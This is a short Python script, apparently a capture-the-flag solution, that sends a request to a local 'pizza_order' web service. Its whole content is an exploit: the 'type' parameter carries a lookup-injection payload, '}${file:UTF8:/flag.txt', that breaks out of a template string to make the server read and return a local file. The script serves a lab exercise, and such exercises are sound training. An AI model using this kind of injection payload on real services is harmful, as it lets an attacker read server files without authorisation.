#!/usr/bin/env python3

import requests

BASE_URL = 'http://localhost:50000/pizza_order'

r = requests.get(BASE_URL + '/order',
                 params={
                     'type': '}${file:UTF8:/flag.txt',
                     'address': 'asd'
                 })

print(r.text)
